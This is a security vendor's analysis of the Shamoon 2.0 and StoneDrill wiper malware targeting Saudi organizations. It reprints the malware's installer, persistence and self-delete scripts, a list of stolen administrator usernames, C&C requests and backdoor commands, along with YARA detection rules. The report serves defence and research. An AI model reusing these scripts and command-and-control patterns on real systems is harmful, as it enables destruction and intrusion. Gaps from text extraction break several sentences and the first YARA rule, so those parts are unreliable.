FROM SHAMOON TO STONEDRILL Wipers attacking Saudi organizations and beyondBeginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks directed at multiple targets in the Middle East. The malware used in the new attacks was a variant of the infamous Shamoon worm that targeted Saudi Aramco and Rasgas back in 2012.Dormant for four years, one of the most mysterious wipers in history has returned.So far, we have observed three waves of attacks of the Shamoon 2.0 malware, activated on 17 November 2016, 29 November 2016 and 23 January 2017.Also known as Disttrack, Shamoon is a highly destructive malware family that effectively wipes the victim machine. A group known as the Cutting Sword of Justice took credit for the Saudi Aramco attack by posting a Pastebin message on the day of the attack (back in 2012), and justified the attack as a measure against the Saudi monarchy.The Shamoon 2.0 attacks observed since November 2016 have targeted organizations in various critical and economic sectors in Saudi Arabia. Just like the previous variant, the Shamoon 2.0 wiper aims for the mass destruction of systems inside targeted organizations.The new attacks share many similarities with the 2012 wave, though featuring new tools and techniques. During the first stage, the attackers obtain administrator credentials for the victim’s network. Next, they build a custom wiper (Shamoon 2.0) which leverages these credentials to spread widely inside the organization. Finally, on a predefined date, the wiper activates, rendering the victim’s machines completely inoperable. It should be noted that the final stages of the attacks have their activity completely automated, without the need for communication with the command and control center.While investigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously unknown wiper malware which appears to be targeting organizations in Saudi Arabia. We’re calling this new wiper StoneDrill. StoneDrill has several “style” similarities to Shamoon, with multiple interesting factors and techniques to allow for the better evasion of detection. In addition to suspected Saudi targets, one victim of StoneDrill was observed on the Kaspersky Security Network (KSN) in Europe. This makes us believe the threat actor behind StoneDrill is expanding its wiping operations from the Middle East to Europe.To summarize some of the characteristics of the new wiper attacks, for both Shamoon and StoneDrill:● Shamoon 2.0 includes a fully functional ransomware module, in addition to its commonwiping functionality.● Shamoon 2.0 has both 32-bit and 64-bit components. ● The Shamoon samples we analyzed in January 2017 do not implement any commandand control (C&C) communication; previous ones included a basic C&C functionality that referenced local servers in the victim’s network.● StoneDrill makes heavy use of evasion techniques to avoid sandbox execution. ● While Shamoon embeds Arabic-Yemen resource language sections, StoneDrill embeds mostly Persian resource language sections. Of course, we do not exclude the possibility of false flags.● StoneDrill does not use drivers during deployment (unlike Shamoon) but relies onmemory injection of the wiping module into the victim’s preferred browser.● Several similarities exist between Shamoon and StoneDrill. ● Multiple similarities were found between StoneDrill and previously analysed NewsBeefattacks.What is new in this report?This report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:1. The discovery techniques and strategies we used for Shamoon and StoneDrill. 2. Details on the ransomware functionality found in Shamoon 2.0. This functionality iscurrently inactive but could be used in future attacks.3. Details on the newly found StoneDrill functions, including its destructive capabilities(even with limited user privileges).4. Details on the similarities between malware styles and malware components’ sourcecode found in Shamoon, StoneDrill and NewsBeef.1. From Shamoon to StoneDrill: the discovery1.1. Shamoon: It’s all about the “resources”Few people ever expected the return of Shamoon after four years of silence. This made the news from the Middle East on 17 November 2016 quite surprising, and sent multiple shockwaves through the industry. After the second wave of attacks, which took place on 29 November 2016, it became quite clear that Shamoon 2.0 was no longer an isolated incident, but part of a new series of attacks and we should expect more waves coming in. In order to make sure that Kaspersky Lab customers were protected, we started to develop specific detection strategies and hunt for possible new variants.To create the new detections, we used multiple ideas:● The Shamoon wipers have their additional payloads stored as encrypted resources. ● Just like in 2012, the early Shamoon 2.0 samples used resources with three veryspecific names - "PKCS7", "PKCS12" and "X509". Because of their uniqueness it was relatively easy to find and detect them just by the resource names and their high entropy. Unfortunately, newer versions had random resource names like "ICO", "LANG" and "MENU", so the ability to easily find new samples was lost.However, all programmers, especially malware writers, have their own habits, and the authors encrypted resource with a specific, although non-unique name "101".This finding got us thinking that the Shamoon attackers can re-use this pattern and we’ve investigated ways of using this to hunt for new, unknown malware generations from their side.As researchers, we tested a lot of different approaches to find similar malicious samples based on this artefact, and one of them worked unexpectedly. Here’s the logic we used to create the detection:1. We assumed that for the next waves of attack the authors would continue to recompile the Shamoon 2.0 version from 2016, while trying to avoid AV detection, so we focused mostly on the newest Shamoon versions.2. We assumed that the wiper would again enumerate all files inside folders, so it wouldstill call Windows API functions FindFirstFile and FindNextFile.3. Because it uses encrypted resources, we assumed that it would find and load them withthe Windows API functions FindResource and LoadResource.4. Inside all known versions of Shamoon 2.0, the resource "101" was found, with thefollowing properties:● Level of entropy > 7.8 - that means the data inside is encrypted or compressed. ● Size about 30 KB - we’ve decided to set the minimum limit at 20 KB. ● Language = neutral (not set); all other resources had the languages "Arabic(Yemen)" or "English United States".● Does not contain an unencrypted PE executable file inside.After initial testing, we decided to add more search criteria to limit the number of possible false positive detections:● Shamoon samples had no digital signature, so the sample would be unsigned. ● All known Shamoon samples with resource "101" had a maximum file size of 370 KB, soit's reasonable to limit the file size to twice that number - 700 KB.● The number of resources inside the sample should not be too high - less than 15.Our favorite malware hunting tool, Yara, provides a rule-bused approach to create descriptions of malware families based on textual or binary patterns.Here’s the detection rule we wrote using all the above conditions:copyright = "Kaspersky Lab" description = "Generic detection for samples that enumerate files with encrypted resource$mz = "This program cannot be run in DOS mode."$a1 = "FindFirstFile" ascii wide nocase $a2 = "FindNextFile" ascii wide nocase $a3 = "FindResource" ascii wide nocase version = "1.4"import "pe" }uint16(0) == 0x5A4D and all of them and filesize < 700000 and pe.number_of_sections > 4 and pe.number_of_signatures == 0 and pe.number_of_resources > 1 and pe.number_of_resources < 15 and for any i in (0 pe.number_of_resources - 1): )(math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and pe.resources[i].id == 101 and pe.resources[i].length > 20000 and pe.resources[i].language == 0 and not ($mz in (pe.resources[i].offset pe.resources[i].offset + pe.resources[i].length))While running the above Yara rule on Kaspersky Lab’s samples selection, we found an interesting, fresh sample. After a quick analysis, we realized it was yet another wiper. However, it was not Shamoon, but something different. We’ve decided to call it StoneDrill.1.2. From StoneDrill to NewsBeefHaving identified the StoneDrill sample through the Yara technique above, we started looking for other possibly related samples.One Yara technique that has proved useful in the past for finding new malware variants is the development of Yara rules for decrypted malware components. During attacks, malware components can be changed to fit the attackers’ requirements, so hunting for decrypted malware code might help in finding new malware variants or even older samples.With StoneDrill, we developed several Yara rules for the decrypted payloads. Here’s one of our = "1.0"rule StoneDrill_main_sub { description = "Rule to detect StoneDrill (decrypted) samples" $code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF 30 8F 44 24 ?? 8B ?? 24 [1 - 4] 2B ?? 24 [6] F7 ?1 [5 - 12] 00} uint16(0) == 0x5A4D and }Interestingly, this rule allowed us to find a new category of samples, which we previously connected with a threat actor named NewsBeef. We wrote about NewsBeef roughly one year ago, in relation to another set of attacks against oil and energy companies from the Middle East.Further analysis indicated the malware samples from StoneDrill and NewsBeef appear to be connected together through numerous internal similarities.The use of simple logic in conjunction with a knowledge of Yara can help attain a state-of-the-art outcome in malware hunting activity. If you would like to learn more, you can join us for the Yara training "Hunt APTs with Yara like a GReAT Ninja" and the advanced “Malware Reverse Engineering course” on April 1-2, 2017 in St. Maarten.Several private intelligence reports on Shamoon, StoneDrill and NewsBeef are available to subscribers of Kaspersky Lab’s Private Intelligence Reports.For more information please contact: intelreports@kaspersky.com2. Technical details - Shamoon 2.0 - language usage and possible Yemeni linksSeveral good technical articles on Shamoon 2.0 have been published by some of our colleagues, including Palo Alto, IBM X-Force, Symantec and others.Throughout this blog we describe some of the technical details of the new Shamoon 2.0 attacks and what are the most important things that make them stand out. For the analysis we used the earliest set of samples, with a hardcoded attack date of 17 November 2016. However, we’ve also included details from the newer samples, such as hardcoded credentials.During deployment in the victim’s environment, the main Shamoon 2.0 wiper module is installed through a Windows Batch file with the following content:@echo off set u100=ntertmgr32.exe set u200=service set u800=%~dp0 copy /Y "%u800%%u100%" "%systemroot%\system32\%u100%" start /b %systemroot%\system32\%u100% %u200%Interestingly, the sample resources appear to have a language ID of “Arabic (Yemen)”, suggesting the attackers might be from Yemen. Of course, we should not disregard the achieve this, it relies on a list of hardcoded, previously stolen username/password pairs belonging to administrators of the targeted domain. All the strings in the malware are obfuscated with simple one byte ADD operations and are decrypted upon execution. All the dropped files exhibit file times altered to match that of the system’s kernel32.dll. The module only works if it is run with exactly one command line parameter, regardless of the parameter. Otherwise, it simply exits (likely a measure to avoid accidental execution).The hardcoded credentials we have observed so far are:Domain name UsernameDomain nameUsernameDomain nameUsernameGACAgacaadmin15CRISTALGLOBAL ckadminSAICOadministratorgacaadmin22jaladmingacaadmin08SADARAmukhsx01AdministratorALAB.localadminGNET and “.”saud.a2pgSCMADMmnxxnadminthirnx01pamadmin1shokax00backupadmnmuneebbeadmincrmadmintvcenterkhaleelmhamdimawalespadminHabib1sysalqifariaadministratorbbadminCUCMUserUnityDirSvccloudsvcSIDFadministrator SCSBqomari.aSIPAucam01shabbirtsfarooqCLIUSRstsaalshamarinbu_serviceadministrator RIYADHfaxserveremail4citrbassUnityMsgStoreSvc YAMSTEELAdministrator456test456TESTDOMAIN .COMtest123yidadmIf the victim host’s system “PROCESSOR_ARCHITECTURE” environment variable is “AMD64” or “amd64”, the module installs its 64-bit variant. The variant is contained within a resourcenamed “X509”. The resource is de-XORed and dropped onto the system under: “NtsSrv”:NameNtsSrvDisplay NameDescriptionMicrosoft Network Realtime Inspection ServiceHelps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocolsThe service is set as dependent on the “RpcSs” system service. The properties of the system service “LanmanWorkstation” are changed so that it depends on the newly created “NtsSrv” service to allow it to start after the malware.2.1.2. Worm FunctionalityOnce this module runs (as a service), the worm-spreading functionality is started, targeting every network host within the IPv4 address range, with the same first three bytes of the victim’s IP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).Here’s how it works:1. The worm connects to a remote machine’s registry and disables Remote UAC by settingthe LocalAccountTokenFilterPolicy registry key value to 1 in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies \system.2. If the RemoteRegistry system service is disabled and doesn't run on the target system,the worm reconfigures this service to be auto-started and then starts it immediately. If the connection to a remote registry is unsuccessful, the worm repeats the connection attempt with a hardcoded set of stolen domain administrator credentials. The worm then searches for remote “\windows\system32\csrss.exe” files by prepending this path with the victim machine’s IP as well as system shares: "ADMIN$", "C$", "D$", "E$".3. Once a remote system32 folder is found, the worm copies itself into this folder under thename “ntssrvr32.exe”. It schedules a remote job to run “ntssrvr32.exe LocalService” after 90 seconds.4. If the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs theservice on the remote machine with the same parameters as it used for self-installation. Attempts with stolen credentials are also performed.5. An alternative but similar infection method is coded into the worm, where each infectionis performed in a separate thread without relying on the scheduler; but it is not used at this time.2.1.3. Command and Control (C&C) ModuleAfter replication, the malware runs a command-and-control communication module. This module is contained within a resource named “Pkcs7”. It is de-XORed and dropped as <%WindowsDir%\system32\netinit.exe>. Using the hardcoded credentials, it creates a Windows Task Scheduler job that executes netinit.exe 90 seconds after creation. It waits 95 seconds and then deletes the scheduled job.2.1.4. Wiper and Encryptor ModuleFinally, the malware drops the wiper/encryptor module. This module first checks if it’s time to run the main payload. The activation period can be set in two ways:1. It checks if the system time is not earlier than the time specified in the following file:<%windir%\inf\usbvideo324.pnf>2. If the file doesn’t exist, it checks that the system time is not earlier than the hardcodeddate: <20:45, 17 Nov 2016>At the specified time, the malware drops two files:The first file, <c:\windows\temp\key8854321.pub> is unused in this attack and contains a public encryption key. This is an indicator that the attackers might be using Shamoon as a ransomware tool in upcoming waves.”-----BEGINPUBLICKEY----- Wfvbk/pP0qDE60Uc7K3Bl7uxbHVB2g8unuj8B9d81TKT0hForie8V2N4FT0bdAHUHU6LT/XtAdLCp9/cTUf8zk1MC oxXj6CSg9xKgGgnJazC/u3R0nm/pPriF/ZkwrVhJtDd/1nf4JC1sDmc3mgv0hI+7hthf+fZkv75doHg67Gg6JOZQIMytQ eF8ylnUgC1ZyrAmaxN0OV69zhktzZISdmmkbtyZSHEZzIdC9PF/MJzCK5ylkEI2jQpAabgv34o2o+ZMJLSDZbNrXy9 0LUy8GjtzJYmv02MVLjy7CSgglIbulSgMP4QC/i1fTIPhlSlMyCKnGIKdKY31KFQnoOzI8kudeted8eF/ubpFcna0TDc Ek+Dt8s4pN4/DsGQoncWg9HMyC8Q/MWIE/JuOCisovJ0PYq2aKetDNRMm7THcXalXKD9RpczObRWKGKzMJD onmBm2AETME74MRPmC/FWgsCAwEAAQ==-----ENDPUBLICKEY-----”The second file is dropped from a resource named “PKCS12”. It is de-XORed and dropped into the %system% directory with a name randomly selected from the following list:caclsrv.exedvdquery.exemsinit.exesigver.exewcscript.execertutl.exeevent.exentfrsutil.exerouteman.exentnw.execlean.exefindfile.exentdsutl.exerrasrv.exectrl.exegpget.exepower.exesacses.exenetx.exefsutl.exedfrag.exeipsecure.exerdsadmin.exesfmsc.exeextract.exednslookup.exeiissrv.exeregsys.exesmbinit.exeThe dropped payload is then scheduled to run in the same way as the C&C communication resource named “X509”. The resource is de-XORed and dropped onto the system under: upon execution. This module periodically connects to a C&C with the following URL:hxxp://server/category/page.php?shinu=w74K9/xQp1VjJfwwadq4HCl7VheuQXk49YnNkb XR+0ghrH YIRFE51FQskZya+jIPqo3VlOEpfvvgxvO26pZ3oA==The strange “server” in the URL string suggests multiple possibilities:1. It is used by mistake. 2. It may suggest a placeholder value that wasn’t set for the purposes of this attack. 3. A server with this name might be installed by the attackers somewhere inside the localnetwork.4. The local network may rely on a now poisoned DNS server.The string also contains the word “shinu=”, which is quite interesting. This is possibly a transliteration of the Gulf Arabic slang word ‘ونش’ for ‘what?’. This particular slang is used in several countries, notably Iraq, but also sometimes in Kuwait and Bahrain. The “shinu” parameter string contains the following encoded information about the victim system:● Host IP and MAC addresses ● Windows version information ● Windows input locale IDs (keyboard layouts) ● Number of connection attempts, or content of the <%WINDIR%\inf\netimm173.pnf> file if the file exists. The <netimm173.pnf> file contains information about changes made by the wiper payload module.If the direct connection fails, this module tries to connect using a hardcoded proxy server of include a working C&C and the operators used a raw, unconfigured C&C module.Data received from the C&C server is handled in two possible ways:1. An executable file is downloaded as <%TEMP%\Temp\filer%rndDigits%.exe> andexecuted immediately thereafter.2. A file is dropped in <%WINDIR%\inf\usbvideo324.pnf> that contains the wiperpayload’s activation time. This effectively allows the attackers to configure the wiper time new ransomware functionality. The wiper module of Shamoon 2.0 has been designed to run as either a wiper or an encryptor (ransomware).1. The module is configured to wipe the disk using the “Death of Alan Kurdi” photo. Thepicture depicts a three-year-old Syrian refugee who drowned as his family attempted to reach Europe and travel on to Canada. The module can also be configured to wipe the disk using random data.2. In the “encryption/ransomware” mode, a weak pseudo-random RC4 key is generated,which is further encrypted by the RSA public key and stored directly on the hard drive (at <\Device\Harddisk0\Partition0>) starting at offset 0x201, right after the master boot record.3. Once the module is extracted, it drops a legitimate driver named <DRDISK.SYS> to the disk and starts it. This driver is used for low-level disk operations and is well known fromprevious Shamoon attacks. Before accessing this driver, the system date is changed to a random day between the 1st and 20th of August, 2012 to fool the driver’s license checks and evaluation period.4. The payload employs the file <%WINDIR%\inf\netimm173.pnf> to keep track of theoperations performed. The content of this file is sent to the C&C server by the communication module.5. The strings in this module are also obfuscated by simple ADD operations and decryptedat start.2.2.3. Payload ConfigurationThere are two 25-byte length configuration strings in the wiper payload:● “SPPPPPPPPPMPPHHHHHHHHHHBO” ● “NNNNNNNNNNWNNNNNNNNNNNWWW”Letters in the first string specify a type of operation to be performed, with the available operations explained below. The second string designates how these operations should be performed: the letter 'N' means that the operation will be executed synchronously in separate threads, the letter 'W' means the operation will wait until a previous step is completed.Here’s an explanation of the configuration string above:LetterOperationThe first operation, marked by the letter 'S' wipes (or encrypts) the content of the Shamoon 2.0 components (netinit.exe, ntssrvr32.exe, and wiper module itself). Using the low-level disk access driver makes it possible to wipe the body of a running executable.The next 9 'P' letters indicate wiping (or encrypting) of the files placed inside the traditional user folders: desktop, download, document, desktop, download, document, picture, video, and music.The 'M' wipes (or encrypts) the NTFS MFT data on all accessible drives mapped from A: to Z:, except the system drive.The next two 'P' letters wipe (or encrypt) files inside the following folders: <C:\Windows\System32\Drivers> and <C:\Windows\System32\Config\systemprofile>The 10 'H' letters wipe (or encrypt) some of the partitions from 9 to 0 on hard disks 9-0 (SystemBoot and FirmwareBootDevice partitions and partition 0 on the system drive are skipped in this step)The 'B' letter wipes (or encrypts) part of the partition designated as FirmwareBootDeviceThe final 'O' wipes (or encrypts) the Master File Table on the system drive, the first sector of \Device\Harddisk0\Partition0, and the last part of the SystemBootDevice partition.SPMPHBOTwo minutes after all tasks are completed, the system is rebooted with the following command: designed to provide direct access to disks and protected files from user-mode applications. Sadly, this functionality has been adopted and abused by multiple threat actors to develop wiper malware, as in the case of the original Shamoon or the Lazarus Destover malware used in the infamous Sony Pictures Entertainment attack of 2014. In order to bypass the EldoS RawDisk drivers’ evaluation period license checks, the Shamoon 2.0 malware changes the system date to a random day between the 1st and 20th of August, 2012.2.3. From Shamoon 2.0 to StoneDrill 1.0StoneDrill has some style similarities to the previously discovered Shamoon samples. Particularly interesting is the heavy use of anti-emulation techniques in the malware, which prevents the automated analysis by emulators or sandboxes.One of the most interesting characteristics is the presence of the Persian language in multiple resource sections.Samples of the StoneDrill malware were uploaded multiple times to multiscanner systems from Saudi Arabia between 27 and 30 November 2016. One StoneDrill victim was also observed in the debug directory. The real timestamp from the debug directory points to: 2016.11.14 21:16:451. The module highlighted above starts from a heavy anti-emulation function that containsnumerous WinAPI calls with invalid parameters. The goal is to break through the detection of antivirus emulators and heuristic detection.2. The second anti-emulation technique is run before the payload execution: this modulecreates a hidden dialog window, then finds and programmatically clicks the “OK” button on that dialog. After that, another series of incorrect WinAPI calls follow.3. The malware then finds the file path of the default Internet browser app by looking intothe following registry keys:a. SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoiceb. HKCR\%ProgId_val%\shell\open\command4. The malware then checks to ensure the browser is not LaunchWinApp.exe or iscompiled for the 64-bit architecture, in which case the path of “%PROGRAM_FILESX86%\Internet Explorer\iexplore.exe” is used instead.5. The default browser is then started and the wiper module is injected into the runningbrowser memory.6. After the successful start of the wiper module, the following script is dropped andexecuted: “%temp%\C-Dlt-C-Org-T.vbs”7. Another temporary file is dropped “%temp%\C-Dlt-C-Trsh-T.tmp” which contains thename of the Injector module; this file is deleted after execution is completed.WScript.Sleep(10 * 1000) On Error Resume Next Set WshShell = CreateObject("Scripting.FileSystemObject") While WshShell.FileExists("%selfname%") WshShell.DeleteFile "%selfname%" Wend WScript.Sleep(10 * 1000) WshShell.DeleteFile "%temp%\C-Dlt-C-Org-T.vbs" directly into the user’s preferred browser process memory. This module inherits the second anti-emulation trick only (clicking the button on the hidden dialog window); it is also obfuscated with the same alphabet-based string encryption. If the browser process privileges do not permit the raw disk wiping, only the user-accessible files are deleted.Depending on the configuration, this module wipes with random data one of following possible targets:● All accessible physical drives by using the device path “\\.\PhysicalDrive” ● All accessible logical drives by using device path “\\.\X:” ● Recursively wipes and deletes files in all folders except “Windows” on all accessiblelogical drives● Places a special emphasis on wiping files named “asdhgasdasdwqe%digits%” in theroot folder of the disk.Just like Shamoon, after the wipe process is completed, the system is rebooted.2.5. The StoneDrill backdoorAccording to the PE timestamps from StoneDrill sample two and sample one (2016.10.19 and 2016.11.14 respectively), this malware file was compiled a month before the previously described StoneDrill sample. However, internally this tool wrapper (injector) looks like a more modern evolution of the previously discussed wiper wrapper. The sample is generally of low quality, with many unused code blocks, unreliable anti-emulation and few non critical bugs. In some cases functions are executed but the results are not used:● Is the current user a domain administrator? ● Is the antivirus process currently running? anti-emulation tricks, injection into the user’s preferred browser and VBS scripts. A distinction in this sample is the wide utilization of the WMI command-line (WMIC) utility to run tasks such as running the dropped VBS script or making registry modifications.Strings in this module are encrypted in two ways:● Alphabet replacement ● SSE XOR 0x52352.6.2. Second step: name construction and installationThis module checks if it is already running from the “%COMMON_APPDATA%\Chrome” folder. In cases where the malware is started from a different folder, the installation procedure is started. During installation, a name is constructed through concatenation of three randomly selected strings from the below three sets, for example - PowerNetworkProxy, RAMFirewallTransfer, LocationAgentFramework:Set1Set2Set3Intel, AMD, Microsoft, Windows, Java, Adobe, Cisco, SunGard, Query, Location, Power, NFC, DotNet, MFC, WMI, SQL, Office, Bitlocker, Map, Fingerprint, Packet, Registery, RAM, CPU, ROM, Memory, Monitor, CDROM, Run-time, Task, Ethernet, Application, Lockscreen, Cloud, Browser, Cash, Desktop, DisplayFile, System, Service, Device, Software, Hardware, VM, Network, Performance, Graphic, Engine, Agent, Data, Wizard, Server, Media, History, Storage, Core, boot, Gaming, FirewallManager, Arranger, Controller, Host, Help, Diagnostics, LogOn, Plug, Proxy, Events, Transfer, Policy, Recovery, Details, Provider, Adapter, CleanUp, Encryption, Extention, APP, Client, Menu, Stub, Execute, Luncher, Framework, Tester, Model, Backup, APIThe VBS script “%TEMP%\C-PDC-C-Cpy-T.vbs” is then dropped in %TEMP%\On Error Resume Next Set WshShell = CreateObject("Scripting.FileSystemObject") WshShell.CopyFile "%SELF_NAME%" , "%COMMON_APPDATA%\Chrome\%SELECTED_NAME%.exe" Set WshShell = NothingC-PDC-C-Cpy-T.vbs body templateThe script is executed using the following command to do self-copy into the “%COMMON_APPDATA%\Chrome” folder:cmd /c WMIC Process Call Create "C:\Windows\System32\Wscript.exe //NOLOGO %TEMP%\C-PDC-C-Cpy- T.vbs"Another VBS script named “C-PDI-C-Cpy-T.vbs” is dropped into %TEMP% folder and executed in the same method (via WMIC used to make a second malware copy with pathname) “C:\ProgramData\InternetExplorer\%SELECTED_NAME%Stp.exe”On Error Resume Next Set WshShell = CreateObject("Scripting.FileSystemObject") WshShell.CopyFile "%COMMON_APPDATA%\Chrome\%SELECTED_NAME%.exe" , "C:\ProgramData\InternetExplorer\%SELECTED_NAME%Stp.exe"C-PDI-C-Cpy-T.vbs body templatePathnames of these two VBS files as well as the initial malware pathname are written into %TEMP%\C-Dlt-C-Trsh-T.tmp file.At the end of the installation procedure the copy of malware (found in “%COMMON_APPDATA%\Chrome\%SELECTED_NAME%.exe”) is executed (via “cmd /c wmic process call create”) and the initial process terminates itself.2.6.3. Third stepWhen the malware is started from within the “%COMMON_APPDATA%\Chrome” folder, the “FileInfo.txt” file is created in the same folder and contains the pathname of the first copy of malware (“%COMMON_APPDATA%\Chrome\%SELECTED_NAME%.exe”)Then the third copy of the malware is created by the command “%COMSPEC% /c copy "%SELFNAME" %TEMP%\bd891.tmp”, which checks the target file to verify if command execution is successful, then deletes the bd891.tmp file. The last mentioned is used as another anti-emulation trick in the StoneDrill arsenal.2.6.4. Fourth step: Payload injectionThe payload is extracted from the resources section, decrypted and unpacked similarly to the previously described wiper injector module. The difference here is that for the decryption of the payload module, SSE instructions are used.In the same style, the payload is injected into the user preferred browser process, with an additional step after the payload module injection: the resource segment responsible for the payload configuration is replaced in memory with the resource taken from the parent module.After the payload start is attempted, the VBS files listed inside C-Dlt-C-Trsh-T.tmp and C-Dlt- C-Trsh-T.tmp are deleted.2.6.5. Fifth step: If not startedIf the payload is not started, then %TEMP%\C-Dlt-C-Org-T.vbs is dropped and executed to delete initial malware copy.WScript.Sleep(10 * 1000) On Error Resume Next Set WshShell = CreateObject("Scripting.FileSystemObject") While WshShell.FileExists("%initial_malware_pathname%") WshShell.DeleteFile "%initial_malware_pathname%" Wend WScript.Sleep(10 * 1000) WshShell.DeleteFile "%TEMP%\C-Dlt-C-Org-T.vbs" process memory. The module is written in C++ with the use of STL classes, with numerous forgotten debug strings.2.7.1. First step: DecryptionStrings in this module are encrypted by ROR, NEG, ADD or simply XOR. An unreliable anti- emulation technique is utilized which makes the whole module unstable. The author assumed that the execution of the Sleep function with parameter 4020 milliseconds would increase the system value of KUSER_SHARED_DATA::InterruptTime to four seconds (rounded to thenearest second). If the InterruptTime is increased only by two seconds this module just exits immediately. In case of other values, the module will crash due to the incorrect decryption of strings.The configuration block is then loaded from resources and decrypted by two passes of XOR.The original module configuration resource is empty - the injector module just patches this resource, replacing the configuration with its own. In the configuration block, “ux” and “uy” are the C&C servers, “Cid” is part of the connection query and seems to be a client ID.2.7.2. Second step: Registering autorun of installer (injector) moduleThe malware reads and de-XORs content of the C:\ProgramData\InternetExplorer\FileInfoStp.txt file, then deletes and unregisters the autorun file defined in FileInfoStp.txt (autorun key deleted from registry) with the command:cmd /c REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Stp /f”Next, the file C:\ProgramData\InternetExplorer\FileInfoStp.txt is deleted and replaced by the @ECHO OFF wmic /NameSpace:\\root\default Class StdRegProv Call SetStringValue hDefKey = "&H80000001" sSubKeyName = "Software\Microsoft\Windows\CurrentVersion\Run" sValue = "C:\ProgramData\InternetExplorer\%SELECTED_NAME%Stp.exe" sValueName = "Stp" Del "%TEMP%\C-Strt-C-Up-T.bat"2.7.3. Third step: C&C server selectionMultiple attempts are made to connect to the hosts configured in the ux and uy fields (found in the sample configuration). The malware issues GET requests to “ct_if/ctpublic/Check_Exist.php”. The server answering with the “HANW-J6YS-P81J-KSD7” string is selected as the current live server.C&C loginThe next connection is a login attempt with the following request:POST / HTTP/1.1 Host: www.eservic.com User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:23.0) Gecko/20100101 Firefox/23.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: url Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 96 username=MD5Sum(login)&password=MD5Sum(password)&button=Login2.7.4. Fourth step: Get commands listDuring the fourth step, the malware requests available commands from the C&C:GET /insert/index?id=%cid_from_config%%random_part_of_client_id%&hst=%base64encoded_computer_and_user_ name_cpuid0_checksum%&ttype=102&sta te=201 HTTP/1.1 Host: www.eservic.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: %string_received_in_login_step% Connection: closeHere is a list of the StoneDrill commands available:CommandInternal Help StringsCommand Descriptionosversiontimeshell1. OS (The is Response the Operating System of the Client Machine)Return details about Windows version, edition, architecture and environment2. Version (The Response is Version of Running Product on the Client Machine)3. Time (The Response is Current Time of the Client Machine)4. Shell Value (Give You Access the CMD Console in the Client Machine; Value is Anything that You Want to Writing in the CMD Console of the Client Machine and Execute it)“2.0.1610.76” string returnedCurrent system and local time are returnedStdout/stderr streams of executed “cmd.exe /C %value%” command are captured and send back to CCscreenshot5. Screenshot (The Response is a JPEG File of the Screenshot of the Client Machine Desktop)1-At first the malware takes screenshot into randomly named .bmp file in %TEMP% folder. 2-Then takes second screenshot, now with jpeg compression and store it as .jpg file with random name. In case of success jpg creation bmp file is deleted. 3-Send screenshot file to C&C and delete temporary files.delay6. Delay Value (Adjust the Time-Interval for the Server and Client Communication; Value can be Between 1000-100000; 1000 is High- End Speed)download7. Download "From" "To" (Download a File From "a URL" To "a Directory on the Client Machine")Downloaded file initially stored as “%TEMP%\Test.tmp”, then deXORed with 0xCC and copied to specified location with VBS script “C- Dled-C-Cpy-T.vbs” as previously described, file is then executed with command:"cmd /c WMIC Process Call Createuploadupdate8. Upload "From" (Upload a File From "a Directory on the Client Machine")9. Update "From" (Download the New Version of the Product From "a URL" and Execute it on the Client Machine)uninstall10. Uninstall (Uninstall The Running Product from the Client Machine and Delete All Side- Effects)antivirus11. Antivirus (The Response is Installed Antivirus on the Client Machine)C:\Windows\System32\Wscri pt.exe //NOLOGODownloaded file initially stored with random name inside %TEMP% folder, then renamed by using C- Uptd-C-Cpy-T.vbs and C-Up-C-Dt-T.bat similar to previous stepsUnregister autorun with command:cmd /c REG DELETE HKCU\SOFTWARE\Microsoft\ Windows\CurrentVersion\Run RMDIR /S /Q "C:\ProgramData\Chrome\" RMDIR /S /Q "C:\ProgramData\InternetExplorer\" Del "%TEMP%\C-Un-C-Instl-T.bat"Then terminates itself.Queries Windows Management Instrumentation (WMI) database for installed AntiVirusProduct details. Runs additional registry lookups for details of: Avast, McAfee, Avg, BitDefender products.12. Help (Response is the List of Supported Commands in the Current Version of Product that Running on the Client Machine)List title is "-Command List of the Current Vesrion are:"help2.8. StoneDrill similarities with ShamoonOf course, one of the most important questions is the following: are StoneDrill and Shamoon connected? This is a difficult question to answer. However, by listing the similarities and differences between the two, anyone can come up with their own answer.Although we used a Yara built on Shamoon samples to find StoneDrill, there are several other similarities between the two:● Both Shamoon and StoneDril appear to be targeting Saudi organizations. ● Samples have been compiled around the same time - October-November 2016. ● Similar to previous generations of Shamoon, StoneDrill uses encrypted PE resources tostore the actual payload.The most important differences include:● To avoid detection by emulators and sandboxing tools, the StoneDrill authors used farmore advanced anti-emulation techniques than Shamoon.● StoneDrill utilises VBS scripts to run self-delete scripts, while Shamoon didn’t use anyexternal scripts.● A distinction from the Shamoon malware is that the strings encryption in StoneDrill isperformed by alphabet table replacement.● StoneDrill does not use drivers during deployment, but rather through memory injectioninto the victim’s preferred browser.2.9. StoneDrill similarities with NewsBeefOur initial analysis of StoneDril revealed some similarities with a threat actor we’ve seen before - NewsBeef. While we call this the NewsBeef APT, this group has been reported in the past as Charming Kitten or Newscaster (in 2014).The similarities between NewsBeef and StoneDrill make us believe there is a very strong connection there. Below we list some of the similarities we observed:2.9.1. Winmain SignatureIn NewsBeef:B8 08 00 FE 7F FF 30 8F 44 24 20 68 B4 0F 00 00 FF 15 78 70 44 00 B8 08 00 FE 7F FF 30 8F 44 24 24 8B 4C 24 24 2B 4C 24 20 B8 6B CA 5F 6B F7 E1 C1 EA 16 80 EA 02 88 15 95 71 45 00In StoneDrill:B8 08 00 FE 7F FF 30 8F 44 24 14 68 B4 0F 00 00 FF 15 4C B0 63 00 B8 08 00 FE 7F FF 30 